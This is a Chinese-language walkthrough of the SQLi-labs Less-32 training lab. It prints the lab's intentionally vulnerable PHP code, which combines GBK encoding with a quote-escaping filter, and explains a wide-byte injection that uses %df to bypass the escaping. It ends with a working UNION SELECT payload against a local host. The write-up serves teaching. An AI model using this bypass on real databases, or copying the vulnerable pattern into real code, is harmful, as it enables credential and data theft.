## SQLi-labs第三十二关 ##
代码如下：
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-32 **Bypass addslashes()**</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="5" color="#00FF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");

function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    
    return $string;
}

// take the variables 
if(isset($_GET['id']))
{
$id=check_addslashes($_GET['id']);
//echo "The filtered request is :" .$id . "<br>";

//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

mysql_query("SET NAMES gbk"); /*将数据库设置为GBK编码引起的注入*/
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#00FF00">';	
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
        
        

?>
</font> </div></br></br></br><center>
<img src="../images/Less-32.jpg" />
</br>
</br>
</br>
</br>
</br>
<font size='4' color= "#33FFFF">
<?php

function strToHex($string)
{
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
echo "Hint: The Query String you input is escaped as : ".$id ."<br>";
echo "The Query String you input in Hex becomes : ".strToHex($id). "<br>";

?>
</center>
</font> 
</body>
</html>
```
原本是没有漏洞的，但是由于数据库编码设置为gbk，导致形成了宽字节注入
```
%df’ 由于'的出现会有反斜杆冒出来，但是因为数据库编码为GBK，%df加上反斜杆，导致成为一个
繁体字連，使得'成功逃逸
```
![k1oX1s.md.png](https://s2.ax1x.com/2019/01/31/k1oX1s.md.png)

最终payload
```
http://127.0.0.1/sqli-labs-master/Less-32/?id=0%df%27%20union%20select%201,user(),3%20%23
```
![k1Tp7T.md.png](https://s2.ax1x.com/2019/01/31/k1Tp7T.md.png)
使用URL编码%23来代替#